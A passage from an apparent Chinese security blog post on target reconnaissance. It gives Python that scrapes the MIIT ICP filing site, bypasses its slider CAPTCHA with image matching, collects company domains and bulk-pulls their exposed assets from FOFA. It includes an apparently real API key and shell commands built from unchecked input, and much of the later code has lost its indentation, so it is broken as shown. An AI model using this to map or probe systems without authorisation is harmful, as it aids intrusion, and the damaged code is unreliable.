class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求超时，正在重试: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            retries -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> retries == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_target</span>(<span class="params">target</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在查询：<span class="subst">&#123;target&#125;</span>&quot;</span>)</span><br><span class="line">    cookie = get_cookies()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">global</span> base_header</span><br><span class="line">            base_header = &#123;</span><br><span class="line">                <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://beian.miit.gov.cn&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://beian.miit.gov.cn/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;__jsluid_s=<span class="subst">&#123;cookie&#125;</span>&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> cookie != -<span class="number">1</span>:</span><br><span class="line">                token = get_token()</span><br><span class="line">                <span class="keyword">if</span> token != -<span class="number">1</span>:</span><br><span class="line">                    check_data = get_check_pic(token)</span><br><span class="line">                    <span class="keyword">if</span> check_data != -<span class="number">1</span>:</span><br><span class="line">                        sign = get_sign(check_data, token)</span><br><span class="line">                        p_uuid = check_data[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">                        <span class="keyword">if</span> sign != -<span class="number">1</span>:</span><br><span class="line">                            info_data = query_base(target)</span><br><span class="line">                            domain_list = get_beian_info(info_data, p_uuid, token, sign)</span><br><span class="line">                            data_saver(domain_list, target)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">raise</span> ValueError(<span class="string">&quot;获取Sign遇到错误，请重试！&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">&quot;计算图片缺口位置错误，请重试！&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">&quot;获取Token失败，如频繁失败请关闭程序后等待几分钟再试！&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cookie = get_cookies()</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;获取Cookie失败，请重试！&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e&#125;</span>\n&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">10</span>)  <span class="comment"># 等待10秒后查询下一个目标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    targets = read_targets_from_file()</span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> target <span class="keyword">in</span> targets:</span><br><span class="line">        t = threading.Thread(target=process_target, args=(target,))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_base</span>(<span class="params">target</span>):</span><br><span class="line">    info = target.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;https://www.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;http://www.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    info = re.sub(<span class="string">&quot;[^\\u4e00-\\u9fa5-A-Za-z0-9,-.()（）]&quot;</span>, <span class="string">&quot;&quot;</span>, info)</span><br><span class="line">    info_data = &#123;<span class="string">&#x27;pageNum&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;unitName&#x27;</span>: info&#125;</span><br><span class="line">    <span class="keyword">return</span> info_data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_cookies</span>():</span><br><span class="line">    cookie_headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32&#x27;</span>&#125;</span><br><span class="line">    err_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> err_num &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    cookie = requests.utils.dict_from_cookiejar(request_with_retry(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;https://beian.miit.gov.cn/&#x27;</span>, headers=cookie_headers, proxies=proxies).cookies)[<span class="string">&#x27;__jsluid_s&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> cookie</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">    err_num += <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_token</span>():</span><br><span class="line">    timeStamp = <span class="built_in">round</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">    authSecret = <span class="string">&#x27;testtest&#x27;</span> + <span class="built_in">str</span>(timeStamp)</span><br><span class="line">    authKey = hashlib.md5(authSecret.encode(encoding=<span class="string">&#x27;UTF-8&#x27;</span>)).hexdigest()</span><br><span class="line">    auth_data = &#123;<span class="string">&#x27;authKey&#x27;</span>: authKey, <span class="string">&#x27;timeStamp&#x27;</span>: timeStamp&#125;</span><br><span class="line">    url = <span class="string">&#x27;https://hlwicpfwc.miit.gov.cn/icpproject_query/api/auth&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    t_response = request_with_retry(<span class="string">&#x27;post&#x27;</span>, url, data=auth_data, headers=base_header, proxies=proxies).json()</span><br><span class="line">    token = t_response[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;bussiness&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_check_pic</span>(<span class="params">token</span>):</span><br><span class="line">    url = <span class="string">&#x27;https://hlwicpfwc.miit.gov.cn/icpproject_query/api/image/getCheckImage&#x27;</span></span><br><span class="line">    base_header[<span class="string">&#x27;Accept&#x27;</span>] = <span class="string">&#x27;application/json, text/plain, */*&#x27;</span></span><br><span class="line">    base_header.update(&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    p_request = request_with_retry(<span class="string">&#x27;post&#x27;</span>, url, data=<span class="string">&#x27;&#x27;</span>, headers=base_header, proxies=proxies).json()</span><br><span class="line">    p_uuid = p_request[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;uuid&#x27;</span>]</span><br><span class="line">    big_image = p_request[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;bigImage&#x27;</span>]</span><br><span class="line">    small_image = p_request[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;smallImage&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="comment"># 解码图片，写入并计算图片缺口位置</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;bigImage.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(base64.b64decode(big_image))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;smallImage.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(base64.b64decode(small_image))</span><br><span class="line">    background_image = cv2.imread(<span class="string">&#x27;bigImage.jpg&#x27;</span>, cv2.COLOR_GRAY2RGB)</span><br><span class="line">    fill_image = cv2.imread(<span class="string">&#x27;smallImage.jpg&#x27;</span>, cv2.COLOR_GRAY2RGB)</span><br><span class="line">    position_match = cv2.matchTemplate(background_image, fill_image, cv2.TM_CCOEFF_NORMED)</span><br><span class="line">    max_loc = cv2.minMaxLoc(position_match)[<span class="number">3</span>][<span class="number">0</span>]</span><br><span class="line">    mouse_length = max_loc + <span class="number">1</span></span><br><span class="line">    os.remove(<span class="string">&#x27;bigImage.jpg&#x27;</span>)</span><br><span class="line">    os.remove(<span class="string">&#x27;smallImage.jpg&#x27;</span>)</span><br><span class="line">    check_data = &#123;<span class="string">&#x27;key&#x27;</span>: p_uuid, <span class="string">&#x27;value&#x27;</span>: mouse_length&#125;</span><br><span class="line">    <span class="keyword">return</span> check_data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_sign</span>(<span class="params">check_data, token</span>):</span><br><span class="line">    check_url = <span class="string">&#x27;https://hlwicpfwc.miit.gov.cn/icpproject_query/api/image/checkImage&#x27;</span></span><br><span class="line">    base_header.update(&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;token&#x27;</span>: token, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    pic_sign = request_with_retry(<span class="string">&#x27;post&#x27;</span>, check_url, json=check_data, headers=base_header, proxies=proxies).json()</span><br><span class="line">    sign = pic_sign[<span class="string">&#x27;params&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> sign</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_beian_info</span>(<span class="params">info_data, p_uuid, token, sign</span>):</span><br><span class="line">    domain_list = []</span><br><span class="line">    info_url = <span class="string">&#x27;https://hlwicpfwc.miit.gov.cn/icpproject_query/api/icpAbbreviateInfo/queryByCondition&#x27;</span></span><br><span class="line">    base_header.update(&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>: p_uuid, <span class="string">&#x27;token&#x27;</span>: token, <span class="string">&#x27;sign&#x27;</span>: sign&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    beian_info = request_with_retry(<span class="string">&#x27;post&#x27;</span>, url=info_url, json=info_data, headers=base_header, proxies=proxies).json()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> beian_info[<span class="string">&quot;success&quot;</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;请求错误: CODE <span class="subst">&#123;beian_info[<span class="string">&quot;code&quot;</span>]&#125;</span> MSG <span class="subst">&#123;beian_info[<span class="string">&quot;msg&quot;</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> domain_list</span><br><span class="line">    domain_total = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;total&#x27;</span>]</span><br><span class="line">    page_total = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;lastPage&#x27;</span>]</span><br><span class="line">    end_row = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;endRow&#x27;</span>]</span><br><span class="line">    info = info_data[<span class="string">&#x27;unitName&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n查询对象：<span class="subst">&#123;info&#125;</span> 共有 <span class="subst">&#123;domain_total&#125;</span> 个已备案域名\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, page_total):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在查询第<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>页……\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, end_row + <span class="number">1</span>):</span><br><span class="line">    info_base = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;list&#x27;</span>][k]</span><br><span class="line">    domain_name = info_base[<span class="string">&#x27;domain&#x27;</span>]</span><br><span class="line">    domain_type = info_base[<span class="string">&#x27;natureName&#x27;</span>]</span><br><span class="line">    domain_licence = info_base[<span class="string">&#x27;mainLicence&#x27;</span>]</span><br><span class="line">    website_licence = info_base[<span class="string">&#x27;serviceLicence&#x27;</span>]</span><br><span class="line">    domain_status = info_base[<span class="string">&#x27;limitAccess&#x27;</span>]</span><br><span class="line">    domain_approve_date = info_base[<span class="string">&#x27;updateRecordTime&#x27;</span>]</span><br><span class="line">    domain_owner = info_base[<span class="string">&#x27;unitName&#x27;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    domain_content_approved = info_base[<span class="string">&#x27;contentTypeName&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> domain_content_approved == <span class="string">&quot;&quot;</span>:</span><br><span class="line">    domain_content_approved = <span class="string">&quot;无&quot;</span></span><br><span class="line"><span class="keyword">except</span> KeyError:</span><br><span class="line">    domain_content_approved = <span class="string">&quot;无&quot;</span></span><br><span class="line">    row_data = domain_owner, domain_name, domain_licence, website_licence, domain_type, domain_content_approved, domain_status, domain_approve_date</span><br><span class="line">    domain_list.append(row_data)</span><br><span class="line">    info_data = &#123;<span class="string">&#x27;pageNum&#x27;</span>: i + <span class="number">2</span>, <span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;unitName&#x27;</span>: info&#125;</span><br><span class="line">    <span class="keyword">if</span> beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;isLastPage&#x27;</span>] <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    beian_info = request_with_retry(<span class="string">&#x27;post&#x27;</span>, info_url, json=info_data, headers=base_header, proxies=proxies).json()</span><br><span class="line">    end_row = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;endRow&#x27;</span>]</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;意外错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> domain_list</span><br><span class="line">    <span class="keyword">return</span> domain_list</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">data_saver</span>(<span class="params">domain_list, target</span>):</span><br><span class="line">    total_row = <span class="built_in">len</span>(domain_list)</span><br><span class="line">    <span class="keyword">if</span> total_row == <span class="number">1</span>:</span><br><span class="line">    total_row = <span class="number">0</span></span><br><span class="line"><span class="keyword">elif</span> total_row == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;所查域名无备案\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;查询结果如下:\n\n<span class="subst">&#123;domain_list&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> winreg</span><br><span class="line">    subkey = <span class="string">r&#x27;Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&#x27;</span></span><br><span class="line">    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey, <span class="number">0</span>)</span><br><span class="line">    desktop_raw = <span class="built_in">str</span>(winreg.QueryValueEx(key, <span class="string">&quot;Desktop&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> desktop_raw == <span class="string">&quot;%USERPROFILE%\Desktop&quot;</span>:</span><br><span class="line">    subkey = <span class="string">r&#x27;Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&#x27;</span></span><br><span class="line">    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey, <span class="number">0</span>)</span><br><span class="line">    desktop_raw = <span class="built_in">str</span>(winreg.QueryValueEx(key, <span class="string">&quot;Desktop&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    desktop_path = desktop_raw.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">    file_path = <span class="string">f&quot;<span class="subst">&#123;desktop_path&#125;</span>备案信息.xlsx&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    file_path = <span class="string">&#x27;./备案信息.xlsx&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(file_path):</span><br><span class="line">    wb = xl.load_workbook(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    wb = xl.Workbook()</span><br><span class="line">    ws = wb.create_sheet(target)</span><br><span class="line">    title_list = [<span class="string">&#x27;域名主办方&#x27;</span>, <span class="string">&#x27;域名&#x27;</span>, <span class="string">&#x27;备案许可证号&#x27;</span>, <span class="string">&#x27;网站备案号&#x27;</span>, <span class="string">&#x27;域名类型&#x27;</span>, <span class="string">&#x27;网站前置审批项&#x27;</span>, <span class="string">&#x27;是否限制接入&#x27;</span>, <span class="string">&#x27;审核通过日期&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">    ws.cell(<span class="number">1</span>, i + <span class="number">1</span>).value = title_list[i]</span><br><span class="line">    col_width = &#123;<span class="string">&#x27;A&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;B&#x27;</span>: <span class="number">40</span>, <span class="string">&#x27;C&#x27;</span>: <span class="number">22</span>, <span class="string">&#x27;D&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;E&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;F&#x27;</span>: <span class="number">15</span>, <span class="string">&#x27;G&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;H&#x27;</span>: <span class="number">21</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> col_width.items():</span><br><span class="line">    ws.column_dimensions[k].width = v</span><br><span class="line">    ws.freeze_panes = <span class="string">&#x27;A2&#x27;</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    after_title = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(start, total_row + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    ws.cell(j + after_title, k + <span class="number">1</span>).value = domain_list[j - start][k]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(ws.max_row):</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(ws.max_column):</span><br><span class="line">    ws.cell(row + <span class="number">1</span>, col + <span class="number">1</span>).alignment = Alignment(horizontal=<span class="string">&#x27;center&#x27;</span>, vertical=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    wb.save(file_path)</span><br><span class="line"><span class="keyword">except</span> PermissionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;** 备案信息登记表格已打开，无法写入文件。如需写入，请关闭文件后重新执行！ **\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;查询结果保存在：<span class="subst">&#123;file_path&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;OK&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>使用的方式：</p><blockquote><p>1.把所有目标公司的全称放在target.txt文件中</p><p>2.然后直接python3 ICP_checks.py</p><p>3.等待结果的生成，都在一个excel中的不同表格中</p></blockquote><h2 id="YpHiq">2.梳理全部域名</h2>拿到的备案的文件了，直接一个脚本给把域名全部提取出来：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> openpyxl <span class="keyword">as</span> xl</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_domains_from_excel</span>(<span class="params">file_path=<span class="string">&#x27;备案信息.xlsx&#x27;</span></span>):</span><br><span class="line">    wb = xl.load_workbook(file_path)</span><br><span class="line">    domain_list = []</span><br><span class="line">    <span class="keyword">for</span> sheet <span class="keyword">in</span> wb.worksheets:</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> sheet.iter_rows(min_row=<span class="number">2</span>, min_col=<span class="number">2</span>, max_col=<span class="number">2</span>):</span><br><span class="line">            domain = row[<span class="number">0</span>].value</span><br><span class="line">            <span class="keyword">if</span> domain:</span><br><span class="line">                domain_list.append(domain)</span><br><span class="line">    <span class="keyword">return</span> domain_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_domains_to_file</span>(<span class="params">domains, file_path=<span class="string">&#x27;domain.txt&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> domain <span class="keyword">in</span> domains:</span><br><span class="line">            file.write(<span class="string">f&#x27;<span class="subst">&#123;domain&#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    domains = extract_domains_from_excel()</span><br><span class="line">    write_domains_to_file(domains)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;域名已提取并保存到 domain.txt\n&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>python3 domain_get.py</p></blockquote><h2 id="zkMeb">3.fofa 梭哈下载</h2>要配合本地fofa sdk进行下载<p>主要是两个命令：</p><p>先确认有多少资产，然后下载</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command = <span class="string">f&quot;fofa search &#x27;domain=\&quot;<span class="subst">&#123;domain&#125;</span>\&quot;&#x27; --count&quot;</span></span><br><span class="line">command = <span class="string">f&quot;fofa search &#x27;domain=\&quot;<span class="subst">&#123;domain&#125;</span>\&quot;&#x27; -f ip,port,domain,link,title,certs_match,certs_expired --size <span class="subst">&#123;asset_count&#125;</span> --save <span class="subst">&#123;domain&#125;</span>.csv&quot;</span></span><br></pre></td></tr></table></figure><p>脚本批量下载：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_domains_from_file</span>(<span class="params">file_path=<span class="string">&#x27;domain.txt&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        domains = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> file.readlines()]</span><br><span class="line">    <span class="keyword">return</span> domains</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_asset_count</span>(<span class="params">domain</span>):</span><br><span class="line">    command = <span class="string">f&quot;fofa search &#x27;domain=\&quot;<span class="subst">&#123;domain&#125;</span>\&quot;&#x27; --count&quot;</span></span><br><span class="line">    output = subprocess.check_output(command, shell=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_fofa_command</span>(<span class="params">domain, asset_count</span>):</span><br><span class="line">    command = <span class="string">f&quot;fofa search &#x27;domain=\&quot;<span class="subst">&#123;domain&#125;</span>\&quot;&#x27; -f ip,port,domain,link,title,certs_match,certs_expired --size <span class="subst">&#123;asset_count&#125;</span> --save <span class="subst">&#123;domain&#125;</span>.csv&quot;</span></span><br><span class="line">    subprocess.run(command, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    domains = read_domains_from_file()</span><br><span class="line">    <span class="keyword">for</span> domain <span class="keyword">in</span> domains:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;正在处理域名：<span class="subst">&#123;domain&#125;</span>&quot;</span>)</span><br><span class="line">        asset_count = get_asset_count(domain)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;资产数量：<span class="subst">&#123;asset_count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> asset_count &gt; <span class="number">0</span>:</span><br><span class="line">            run_fofa_command(domain, asset_count)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;已保存 <span class="subst">&#123;domain&#125;</span>.csv\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;跳过 <span class="subst">&#123;domain&#125;</span>，没有资产\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">fofa search <span class="string">&#x27;domain=&quot;chinamoney.com.cn&quot;&#x27;</span> -f ip,port,domain,link,title,certs_match,certs_expired --size <span class="number">80</span> --save chinamoney.com.cn.csv</span><br></pre></td></tr></table></figure><blockquote><p>python3 domain_fofa.py</p></blockquote><p>然后你就能拥有所有可以打可以提交的目标了</p><h1 id="VI2iE">其他查询平台：</h1>[xiaomi.com网站备案查询 , 站长工具](https://micp.chinaz.com/xiaomi.com)<p><a href="http://www.jucha.com/beian/">icp备案查询-域名备案号批量查询工具-聚查网</a></p><p>chainz查询接口：</p><p><a href="https://apidatav2.chinaz.com/single/newicp?key=b6ce015a88144d9b84a6a95dd917c0ff&domain=chinaz.com">https://apidatav2.chinaz.com/single/newicp?key=xxxxx&domain=chinaz.com</a></p><h1 id="iTTMv">其他综合工具</h1>[GitHub - wgpsec/ENScan_GO: 一款基于各大企业信息API的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司ICP备案、APP、小程序、微信公众号等信息聚合导出。](https://github.com/wgpsec/ENScan_GO)<p><a href="https://github.com/i11us0ry/AScan">GitHub - i11us0ry&#x2F;AScan: 